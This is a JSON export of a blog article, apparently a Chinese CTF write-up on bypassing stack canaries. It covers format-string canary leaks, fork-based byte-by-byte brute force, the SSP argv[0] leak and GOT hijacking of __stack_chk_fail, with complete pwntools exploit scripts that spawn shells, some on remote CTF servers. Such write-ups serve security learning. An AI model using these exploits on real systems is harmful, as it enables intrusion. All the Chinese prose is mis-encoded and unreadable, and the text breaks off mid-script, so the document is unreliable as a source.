{"title":"ç»•è¿‡canaryçš„å…­ç§æ–¹æ³•","uid":"3c52b98d7c3f3c00c8108b428bc990ce","slug":"ç»•è¿‡canaryçš„æ–¹æ³•","date":"2021-10-25T12:49:23.000Z","updated":"2021-12-29T10:25:32.044Z","comments":true,"path":"api/articles/ç»•è¿‡canaryçš„æ–¹æ³•.json","keywords":null,"cover":"https://i.loli.net/2021/10/29/DCnioH4MfqYX28I.jp","content":"<p><strong><a href=\"https://www.anquanke.com/post/id/262846\">æ–‡ç« é¦–å‘äºå®‰å…¨å®¢</a></strong></p>\n<h1 id=\"ç®€ä»‹\"><a href=\"#ç®€ä»‹\" class=\"headerlink\" title=\"ç®€ä»‹\"></a>ç®€ä»‹</h1><p>canaryä¿æŠ¤åˆç§°é‡‘ä¸é›€ä¿æŠ¤ï¼Œä½œç”¨æ˜¯ä¸ºäº†é˜²æ­¢æ ˆæº¢å‡ºçš„ä¸€ç§ä¿æŠ¤æœºåˆ¶ã€‚å·¥ä½œåŸç†æ˜¯ä»fs/gså¯„å­˜å™¨å–å€¼æ”¾åœ¨rbp-4æˆ–è€…rbp-8çš„ä½ç½®ï¼ˆ32ä½/64ä½ï¼‰ï¼Œå½“ç”¨æˆ·è¾“å…¥ç»“æŸåï¼Œç¨‹åºä¼šä»rbp-4æˆ–è€…rbp-8çš„ä½ç½®å–å‡ºå¹¶ä¸fs/gså¯„å­˜å™¨å¯¹åº”ä½ç½®çš„å€¼è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœä¸ç›¸ç­‰å°±ä¼šæ‰§è¡Œ__ stack_chk_failå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å¼ºè¡Œåœæ­¢ç¨‹åºè¿è¡Œå¹¶å‘å‡ºè­¦å‘Šï¼Œä»è€Œé˜»æ­¢æ ˆæº¢å‡ºæ”»å‡»ã€‚å½“ç„¶ï¼Œè¿™ç§ä¿æŠ¤å¹¶ä¸æ˜¯ä¸‡æ— ä¸€å¤±çš„ï¼Œä¸‹é¢æˆ‘å°†ä¼šåˆ—ä¸¾å‡º6ç§ç»•è¿‡canaryçš„æ–¹æ³•ï¼Œæ¯ç§æ–¹æ³•å¤šå°‘éƒ½æœ‰ä¸€å®šçš„é™åˆ¶ï¼Œå…·ä½“è¿˜æ˜¯è¦ä¾æ®é¢˜ç›®æ¥å†³å®šé‡‡ç”¨ä½•ç§æ–¹æ³•ã€‚</p>\n<p>ä¸‹é¢åˆ—ä¸¾ä¸€ä¸ª64ä½ä¸‹çš„canaryä¿æŠ¤è¿è¡Œæœºåˆ¶ï¼š</p>\n<p>ç¨‹åºå¼€å¯canaryä¿æŠ¤åï¼Œåœ¨è¿è¡Œå¼€å§‹ä¼šä»fså¯„å­˜å™¨åç§»ä¸º0x28çš„ä½ç½®ä¸­å–å‡º8å­—èŠ‚æ”¾å…¥raxå¯„å­˜å™¨ä¸­ï¼Œä¹‹åraxä¼šå°†å…¶æ”¾åœ¨rbp-8çš„ä½ç½®ï¼Œæœ€åå°†raxçš„å€¼æ¸…é›¶</p>\n<p><img src=\"https://s2.loli.net/2021/12/10/C2oJqAKepRH8BiZ.png\" alt=\"image.png\"></p>\n<p>ç¨‹åºæ¥æ”¶æˆ‘ä»¬çš„è¾“å…¥åä¼šè¿›è¡Œæ£€æŸ¥ï¼Œå¦‚æœcanaryè¢«è¦†ç›–å°±ä¼šæ‰§è¡Œstack_chk_failå‡½æ•°ä»è€Œé˜»æ­¢ç¨‹åºç»§ç»­è¿è¡Œ</p>\n<p><img src=\"https://s2.loli.net/2021/12/10/H3vazkQ5iLtGXZ6.png\" alt=\"image.png\"></p>\n<p><img src=\"https://s2.loli.net/2021/12/10/OQK5wqpPRMbArCx.png\" alt=\"image.png\"></p>\n<h1 id=\"leakç»•è¿‡\"><a href=\"#leakç»•è¿‡\" class=\"headerlink\" title=\"leakç»•è¿‡\"></a>leakç»•è¿‡</h1><p>é€šè¿‡æ³„éœ²canaryæ¥ç»•è¿‡canaryï¼Œå¸¸è§çš„æœ‰è¦†ç›–æ‰å‰é¢çš„\\x00è®©è¾“å‡ºå‡½æ•°æ³„éœ²ï¼Œè¿˜æœ‰printfå®šç‚¹æ³„éœ²ã€‚</p>\n<h2 id=\"stackguard1\"><a href=\"#stackguard1\" class=\"headerlink\" title=\"stackguard1\"></a><strong>stackguard1</strong></h2><p>ä¸€ä¸ªç®€å•çš„64ä½canaryä¿æŠ¤ç¨‹åºï¼Œgdbè°ƒè¯•å¯ä»¥çœ‹åˆ°ä¸€å¼€å§‹ç¨‹åºä¼šä»fså¯„å­˜å™¨å¯¹åº”çš„åç§»å¤„å–å€¼æ”¾å…¥raxä¸­ï¼Œraxä¼šæ”¾å…¥rbp-8çš„ä½ç½®ï¼Œæœ€åæ¸…é›¶eax</p>\n<p><img src=\"https://i.loli.net/2021/10/22/iMEf48ZNa927yjJ.png\" alt=\"å±å¹•æˆªå›¾ 2021-10-22 195020.png\"></p>\n<p>ç¨‹åºè¿è¡Œåˆ°å¿«ç»“æŸæ—¶ï¼Œä¼šæ£€æŸ¥canaryï¼Œé¦–å…ˆå°†canaryå–å‡ºåˆ°rcxï¼Œrcxä¼šå’Œfså¯„å­˜å™¨å¯¹åº”çš„åç§»å¤„å–å‡ºè¿›è¡Œæ¯”è¾ƒï¼Œä¸åŒå°±ä¼šè·³è½¬åˆ°__stack_chk_fail@pltä½ç½®ï¼Œå¼ºè¡Œç»“æŸè¿›ç¨‹å¹¶å¼¹å‡ºè­¦å‘Š</p>\n<p><img src=\"https://i.loli.net/2021/10/22/9yZLESIY7cpKO8r.png\" alt=\"å±å¹•æˆªå›¾ 2021-10-22 195405.png\"></p>\n<p>åˆ†ææ ˆç»“æ„ï¼šç¼“å†²åŒºè¿‡åå°±æ˜¯canaryï¼Œæ‰€ä»¥å¦‚æœæ˜¯ç®€å•çš„æº¢å‡ºè¦†ç›–è¿”å›åœ°å€å°±ä¼šè¦†ç›–åˆ°canaryï¼Œä»è€Œå¯¼è‡´ç¨‹åºå´©æºƒã€‚å› æ­¤ï¼Œå¦‚æœè¦åˆ©ç”¨æ ˆæº¢å‡ºå°±ä¸€å®šè¦ç»•è¿‡canaryã€‚æ‰€ä»¥æ€è·¯å°±æ˜¯å…ˆé€šè¿‡è¾“å‡ºå‡½æ•°æ³„éœ²canaryçš„å€¼ï¼Œä¹‹ååœ¨è¦†ç›–æ—¶ç”¨æ³„éœ²çš„canaryå€¼è¦†ç›–canaryï¼Œå…¶å®ƒçš„å°±è¦†ç›–æˆæˆ‘ä»¬æƒ³è¦çš„ï¼Œè¿™æ ·å°±ç»•è¿‡äº†canaryã€‚</p>\n<p><img src=\"https://s2.loli.net/2021/12/10/6vPba7V3kLoTJNi.png\" alt=\"image.png\"></p>\n<p>é€šè¿‡å­—ç¬¦ä¸²åˆ—è¡¨æ‰¾åˆ°bin/shï¼Œæ‰¾åˆ°è°ƒç”¨çš„ä½ç½®ï¼Œå‘ç°å‡½æ•°canary_protect_meå‡½æ•°é‡Œé¢ä¼šè°ƒç”¨è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªåé—¨å‡½æ•°è·å–åˆ°shell</p>\n<p><img src=\"https://i.loli.net/2021/10/22/aFk6zUoXZ4H983J.png\" alt=\"å±å¹•æˆªå›¾ 2021-10-22 201418.png\"></p>\n<p>ç»§ç»­åˆ†æï¼Œç¨‹åºå­˜åœ¨ä¸¤æ¬¡è¾“å…¥ï¼Œä¸€æ¬¡getsè¾“å…¥ï¼Œä¸€æ¬¡readè¾“å…¥ï¼Œä¸­é—´å­˜åœ¨printfå‡½æ•°ï¼Œå¯ä»¥å¯¹ä»»æ„åœ°å€è¿›è¡Œæ³„éœ²</p>\n<p><img src=\"https://s2.loli.net/2021/12/10/TewV1K5HpMalszF.png\" alt=\"image.png\"></p>\n<p>æ¥ä¸‹æ¥readè¯»å–æ—¶ï¼Œå…è®¸è¯»å–çš„0x60ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯åœ¨0x28å¤„å°±é‡åˆ°canaryï¼Œ0x38å°±æ˜¯è¿”å›åœ°å€ï¼Œæ˜æ˜¾å­˜åœ¨æ ˆæº¢å‡º</p>\n<p><img src=\"https://s2.loli.net/2021/12/10/GnocUENKTSdXvQV.png\" alt=\"image.png\"></p>\n<p><img src=\"https://s2.loli.net/2021/12/10/UcOmtof3NdDJgl4.png\" alt=\"image.png\"></p>\n<p>æ‰€ä»¥æ€è·¯åŸºæœ¬å°±æ˜¯ï¼Œå…ˆåˆ©ç”¨ç¬¬ä¸€æ¬¡è¾“å…¥æ³„éœ²canaryï¼Œåœ¨ç¬¬äºŒæ¬¡è¾“å…¥æ—¶ç»•è¿‡canaryå¹¶ä¿®æ”¹è¿”å›åœ°å€åˆ°back_door</p>\n<p>å› ä¸ºæ˜¯getså‡½æ•°æœ€åä¼šè¡¥ä¸Š\\x00ï¼Œä¼šç»ˆæ­¢printfè¯»å–ï¼Œæ‰€ä»¥æ— æ³•é€šè¿‡è¦†ç›–æ³„éœ²ï¼Œä½†å› ä¸ºæ˜¯printfè¾“å‡ºï¼Œæ‰€ä»¥å¯ä»¥é‡‡å–æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²canary<img src=\"https://i.loli.net/2021/10/22/Sc4iJadPK5pWV32.png\" alt=\"å±å¹•æˆªå›¾ 2021-10-22 203619.png\"></p>\n<p>è·å–gadget</p>\n<p><img src=\"https://s2.loli.net/2021/12/10/pBxn7JROUovqdtA.png\" alt=\"image.png\"></p>\n<h2 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\">back_door = <span class=\"number\">0x4011d6</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot; ROPgadget --binary stackguard1 --only &quot;&quot;&quot;</span>pop|ret<span class=\"string\">&quot;|grep &quot;</span>rdi<span class=\"string\">&quot; &quot;</span><span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">pop_rdi_ret = <span class=\"number\">0x0401343</span></span><br><span class=\"line\">bin_sh = <span class=\"number\">0x402004</span></span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./stackguard1&#x27;)</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;123.57.230.48&#x27;</span>,<span class=\"number\">12344</span>)</span><br><span class=\"line\">payload1 = <span class=\"string\">&#x27;%11$p&#x27;</span>  <span class=\"comment\"># æ³„éœ²canary</span></span><br><span class=\"line\">p.sendline(payload1)</span><br><span class=\"line\">canary=<span class=\"built_in\">int</span>(p.recv(),<span class=\"number\">16</span>)  <span class=\"comment\"># æ¥å—canary</span></span><br><span class=\"line\"><span class=\"built_in\">print</span> canary</span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x28</span>+p64(canary)+<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">8</span>+p64(back_door))</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p,&#x27;b main&#x27;)</span></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"one-by-oneçˆ†ç ´\"><a href=\"#one-by-oneçˆ†ç ´\" class=\"headerlink\" title=\"one by oneçˆ†ç ´\"></a>one by oneçˆ†ç ´</h1><p>one by oneçˆ†ç ´æ€æƒ³æ˜¯åˆ©ç”¨forkå‡½æ•°æ¥ä¸æ–­é€å­—èŠ‚æ³„éœ²ã€‚è¿™é‡Œä»‹ç»ä¸€ä¸‹forkå‡½æ•°ï¼Œforkå‡½æ•°ä½œç”¨æ˜¯é€šè¿‡ç³»ç»Ÿè°ƒç”¨åˆ›å»ºä¸€ä¸ªä¸åŸæ¥è¿›ç¨‹å‡ ä¹å®Œå…¨ç›¸åŒçš„è¿›ç¨‹ï¼Œè¿™é‡Œçš„ç›¸åŒä¹ŸåŒ…æ‹¬canaryã€‚å½“ç¨‹åºå­˜åœ¨forkå‡½æ•°å¹¶è§¦å‘canaryæ—¶ï¼Œ__ stack_chk_failå‡½æ•°åªèƒ½å…³é—­forkå‡½æ•°æ‰€å»ºç«‹çš„è¿›ç¨‹ï¼Œä¸ä¼šè®©ä¸»è¿›ç¨‹é€€å‡ºï¼Œæ‰€ä»¥å½“å­˜åœ¨å¤§é‡è°ƒç”¨forkå‡½æ•°æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒæ¥ä¸€å­—èŠ‚ä¸€å­—èŠ‚çš„æ³„éœ²ï¼Œæ‰€ä»¥å«åšone by oneçˆ†ç ´ã€‚</p>\n<h2 id=\"bin1\"><a href=\"#bin1\" class=\"headerlink\" title=\"bin1\"></a>bin1</h2><p>ç¨‹åºä¸­å­˜åœ¨forkå‡½æ•°ï¼Œè€Œä¸”è¿˜æ˜¯ä¸æ–­å¾ªç¯ï¼Œç¬¦åˆone by oneçˆ†ç ´æ¡ä»¶ï¼Œå› ä¸ºæ˜¯32ä½ç¨‹åºï¼Œcanaryç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯\\x00ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦çˆ†ç ´3ä¸ªå­—èŠ‚ï¼Œè¿™ä¸‰ä¸ªå­—èŠ‚å¯¹åº”çš„åå…­è¿›åˆ¶ç èŒƒå›´ä¸º00~FF</p>\n<p><img src=\"https://i.loli.net/2021/10/26/lFXwj8JfDAdoEsZ.png\" alt=\"å±å¹•æˆªå›¾ 2021-10-26 083224.png\"></p>\n<p>çˆ†ç ´åŸç†ï¼š</p>\n<p>æˆ‘ä»¬æ¯æ¬¡å°è¯•å¤šæº¢å‡ºä¸€å­—èŠ‚ï¼Œå¦‚æœæ¥æ”¶åˆ°è¿›ç¨‹é”™è¯¯é€€å‡ºå°±å°è¯•å¦ä¸€ç§å­—ç¬¦ï¼›å¦‚æœæ¥æ”¶åˆ°æ­£å¸¸è¿”å›å°±ç»§ç»­æº¢å‡ºä¸€å­—èŠ‚ï¼Œç›´åˆ°canaryè¢«å®Œå…¨æ³„éœ²ã€‚å› ä¸ºæ²¡æœ‰è¿œç«¯ç¯å¢ƒåŠ ä¸Šæ²¡æœ‰flagæ–‡ä»¶ï¼Œæ‰€ä»¥æ˜¯get flag error</p>\n<p><img src=\"https://s2.loli.net/2021/12/10/pfwXaxBKnYVCQGv.png\" alt=\"image.png\"></p>\n<h2 id=\"EXP-1\"><a href=\"#EXP-1\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">local = <span class=\"number\">1</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./bin1&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> local:</span><br><span class=\"line\">    p = process(<span class=\"string\">&#x27;./bin1&#x27;</span>)</span><br><span class=\"line\">    libc = elf.libc</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    p = remote(<span class=\"string\">&#x27;&#x27;</span>,)</span><br><span class=\"line\">    libc = ELF(<span class=\"string\">&#x27;./&#x27;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;welcome\\n&#x27;</span>)</span><br><span class=\"line\">canary = <span class=\"string\">&#x27;\\x00&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">256</span>):</span><br><span class=\"line\">        <span class=\"built_in\">print</span> <span class=\"string\">&quot;index &quot;</span> + <span class=\"built_in\">str</span>(k) + <span class=\"string\">&quot;: &quot;</span> + <span class=\"built_in\">chr</span>(i)</span><br><span class=\"line\">        p.send(<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">100</span> + canary + <span class=\"built_in\">chr</span>(i))</span><br><span class=\"line\">        a = p.recvuntil(<span class=\"string\">&quot;welcome\\n&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span> a</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;sucess&quot;</span> <span class=\"keyword\">in</span> a:</span><br><span class=\"line\">                canary += <span class=\"built_in\">chr</span>(i)</span><br><span class=\"line\">                <span class=\"built_in\">print</span> <span class=\"string\">&quot;canary: &quot;</span> + canary</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">addr = <span class=\"number\">0x0804863B</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;A&#x27;</span> * <span class=\"number\">100</span> + canary + <span class=\"string\">&#x27;A&#x27;</span> * <span class=\"number\">12</span> + p32(addr)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"sspæ”»å‡»\"><a href=\"#sspæ”»å‡»\" class=\"headerlink\" title=\"sspæ”»å‡»\"></a>sspæ”»å‡»</h1><p>å½“ç¨‹åºæ£€æµ‹åˆ°æ ˆæº¢å‡ºæ—¶ï¼Œç¨‹åºä¼šæ‰§è¡Œ __ stack_chk_failå‡½æ•°ï¼Œè€Œ__ stack_chk_failå‡½æ•°ä½œç”¨æ˜¯é˜»æ–­ç¨‹åºç»§ç»­æ‰§è¡Œï¼Œå¹¶è¾“å‡ºargv[0]è­¦å‘Šï¼Œè€Œsspæ”»å‡»åŸç†æ˜¯é€šè¿‡è¾“å…¥è¶³å¤Ÿé•¿çš„å­—ç¬¦ä¸²è¦†ç›–æ‰argv[0]ï¼Œè¿™æ ·å°±èƒ½è®©canaryä¿æŠ¤è¾“å‡ºæˆ‘ä»¬æƒ³è¦åœ°å€ä¸Šçš„å€¼ã€‚</p>\n<p><strong>æ³¨æ„ï¼šè¿™ä¸ªæ–¹æ³•åœ¨glibc2.27åŠä»¥ä¸Šçš„ç‰ˆæœ¬ä¸­å·²å¤±æ•ˆ</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">void</span></span><br><span class=\"line\">__attribute__ ((noreturn))</span><br><span class=\"line\">__stack_chk_fail (<span class=\"keyword\">void</span>) &#123;</span><br><span class=\"line\">\t__fortify_fail (<span class=\"string\">&quot;stack smashing detected&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">void</span></span><br><span class=\"line\">__attribute__ ((noreturn))</span><br><span class=\"line\">__fortify_fail (msg)</span><br><span class=\"line\">   <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *msg; &#123;</span><br><span class=\"line\">      <span class=\"comment\">/* The loop is added only to keep gcc happy. */</span></span><br><span class=\"line\">         <span class=\"keyword\">while</span> (<span class=\"number\">1</span>)</span><br><span class=\"line\">              __libc_message (<span class=\"number\">2</span>, <span class=\"string\">&quot;*** %s ***: %s terminated\\n&quot;</span>, msg, __libc_argv[<span class=\"number\">0</span>] ?: <span class=\"string\">&quot;&lt;unknown&gt;&quot;</span>) </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">libc_hidden_def (__fortify_fail)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>ä¸Šé¢æ˜¯ stack_chk_fail()å‡½æ•°çš„æºç ï¼Œåœ¨libc_messageå‡½æ•°ä¸­ç¬¬äºŒä¸ª%sè¾“å‡ºçš„å°±æ˜¯__libc_argv[0]ï¼Œargv[0]æ˜¯æŒ‡å‘ç¬¬ä¸€ä¸ªå¯åŠ¨å‚æ•°å­—ç¬¦ä¸²çš„æŒ‡é’ˆã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ ˆæº¢å‡ºå°†å…¶è¦†ç›–æˆæˆ‘ä»¬æƒ³è¦æ³„éœ²çš„åœ°å€ï¼Œå½“ç¨‹åºè§¦å‘åˆ°canaryæ—¶å°±å¯ä»¥æ³„éœ²æˆ‘ä»¬æƒ³è¦çš„ä¸œè¥¿äº†ã€‚</p>\n<h2 id=\"smashes\"><a href=\"#smashes\" class=\"headerlink\" title=\"smashes\"></a>smashes</h2><p>é€šè¿‡åæ±‡ç¼–å‘ç°ç¨‹åºä¼šè¿›å…¥ä¸€ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¸­å­˜åœ¨getså±é™©å‡½æ•°ï¼Œå¯ä»¥åˆ©ç”¨å®ƒè¿›è¡Œæ ˆæº¢å‡ºæ“ä½œã€‚<img src=\"https://i.loli.net/2021/11/15/UrIOTvQfePFLdlj.png\" alt=\"image.png\"></p>\n<p>åœ¨å­—ç¬¦ä¸²çª—å£å‘ç°flagå­—æ ·ï¼Œæ ¹æ®æç¤ºæˆ‘ä»¬å¯ä»¥çŸ¥é“flagå°±åœ¨è¿™é‡Œï¼Œä¸è¿‡æ˜¯åœ¨è¿œç«¯ç¯å¢ƒä¸­<img src=\"https://i.loli.net/2021/11/15/vt1PArjFWlipJY9.png\" alt=\"image.png\"></p>\n<p>æ‰€ä»¥æˆ‘ä»¬åªè¦å°†argv[0]æŒ‡å‘è¿™ä¸ªåœ°å€å°±å¯ä»¥æ³„éœ²ã€‚</p>\n<p>ä½†æ˜¯åé¢å‘ç°è¡Œä¸é€šï¼Œå¹¶æ²¡æœ‰æ³„éœ²æˆ‘ä»¬æƒ³è¦æ³„éœ²çš„åœ°å€é‡Œé¢çš„å€¼ã€‚<img src=\"https://i.loli.net/2021/11/15/TZRsh7QgEb5V4Kd.png\" alt=\"image.png\"></p>\n<p>å›åˆ°ä¼ªä»£ç é‡Œé¢å‘ç°ä¸‹é¢ä¸€è¡Œ</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">memset</span>((<span class=\"keyword\">void</span> *)((<span class=\"keyword\">signed</span> <span class=\"keyword\">int</span>)v0 + <span class=\"number\">0x600D20</span>LL), <span class=\"number\">0</span>, (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)(<span class=\"number\">32</span> - v0));</span><br></pre></td></tr></table></figure>\n\n<p>è¿™è¡Œä»£ç ä¼šå°†0x600D20è¿™ä¸ªåœ°å€é‡Œé¢çš„å€¼æ¸…ç©ºï¼Œå¯¼è‡´flagè¢«æ¸…é™¤ã€‚çœ‹äº†ä¸€ä¸‹ä¸€äº›å¸ˆå‚…çš„åšå®¢äº†è§£åˆ°ELFçš„é‡æ˜ å°„ã€‚<strong>å½“å¯æ‰§è¡Œæ–‡ä»¶è¶³å¤Ÿå°çš„æ—¶å€™ï¼Œä»–çš„ä¸åŒåŒºæ®µå¯èƒ½ä¼šè¢«å¤šæ¬¡æ˜ å°„ã€‚ä¹Ÿå°±æ˜¯è¯´è¯¥flagä¼šåœ¨å…¶ä»–åœ°æ–¹è¿›è¡Œå¤‡ä»½ã€‚</strong></p>\n<p><img src=\"https://i.loli.net/2021/11/15/QGDmy4HdWTqeKcz.png\" alt=\"image.png\"></p>\n<p>åŒæ—¶è¿˜è¦æ³¨æ„ä¸€ç‚¹ï¼Œ64ä½ä¸‹åœ°å€éƒ½æ˜¯8çš„å€æ•°æ‰€ä»¥æœ€ç»ˆæˆ‘ä»¬è¦æ³„éœ²çš„åœ°å€æ˜¯0x400d20</p>\n<h2 id=\"EXP-2\"><a href=\"#EXP-2\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = &#x27;debug&#x27;</span><br><span class=\"line\">p = remote(<span class=\"string\">&quot;pwn.jarvisoj.com&quot;</span>,<span class=\"number\">9877</span>)</span><br><span class=\"line\">p.recvuntil(&#x27;name? &#x27;)</span><br><span class=\"line\">p.sendline(p64(<span class=\"number\">0x400d20</span>)*<span class=\"number\">300</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"åŠ«æŒ-stack-chk-fail\"><a href=\"#åŠ«æŒ-stack-chk-fail\" class=\"headerlink\" title=\"åŠ«æŒ___stack_chk_fail\"></a>åŠ«æŒ___stack_chk_fail</h1><p>canaryä¿æŠ¤åŸç†æ— éå°±æ˜¯æ£€æµ‹åˆ°æº¢å‡ºåè°ƒç”¨ __ stack_chk_failå‡½æ•°ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿä¿®æ”¹ __ stack_chk_failå‡½æ•°çš„gotè¡¨ä¸ºåé—¨å‡½æ•°ï¼Œå½“æ£€æµ‹æº¢å‡ºè°ƒç”¨ __ stack_chk_failå‡½æ•°åï¼Œç¨‹åºå°±ä¸ä¼šé€€å‡ºå¹¶è­¦å‘Šè€Œæ˜¯æ‰§è¡Œæˆ‘ä»¬çš„åé—¨å‡½æ•°ã€‚</p>\n<h2 id=\"BJDCTF-2nd-r2t4\"><a href=\"#BJDCTF-2nd-r2t4\" class=\"headerlink\" title=\"[BJDCTF 2nd]r2t4\"></a>[BJDCTF 2nd]r2t4</h2><p>è¿›å…¥IDAå¾ˆå®¹æ˜“å°±å‘ç°åé—¨å‡½æ•°</p>\n<p><img src=\"https://s2.loli.net/2021/12/10/VhpjSlIYQkn7KbF.png\" alt=\"image.png\"></p>\n<p>ç»§ç»­åˆ†æï¼Œç¨‹åºåªå­˜åœ¨ä¸€æ¬¡è¾“å…¥è¾“å‡ºï¼Œä½†è¾“å‡ºå´è°ƒç”¨printfå‡½æ•°ï¼Œä¹Ÿå°±å­˜åœ¨æ ¼å¼å­—ç¬¦ä¸²æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å…¶ä¿®æ”¹æˆ–æ³„éœ²ä»»æ„åœ°å€</p>\n<p><img src=\"https://s2.loli.net/2021/12/10/bKSDEhdouHgTcUx.png\" alt=\"image.png\"></p>\n<p>æ‰¾åˆ°canryå¯¹åº”çš„åç§»å¹¶åˆ©ç”¨printfä¿®æ”¹ __ stack_chk_failå‡½æ•°çš„gotè¡¨</p>\n<p><img src=\"https://s2.loli.net/2021/12/10/UC9hdcIopDPEVqz.png\" alt=\"image.png\"></p>\n<p>æœ€åè·å¾—flag</p>\n<p><img src=\"https://s2.loli.net/2021/12/10/Bioh8X2NzuOGKZv.png\" alt=\"image.png\"></p>\n<h2 id=\"EXP-3\"><a href=\"#EXP-3\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./r2t4&#x27;</span>)</span><br><span class=\"line\">elf 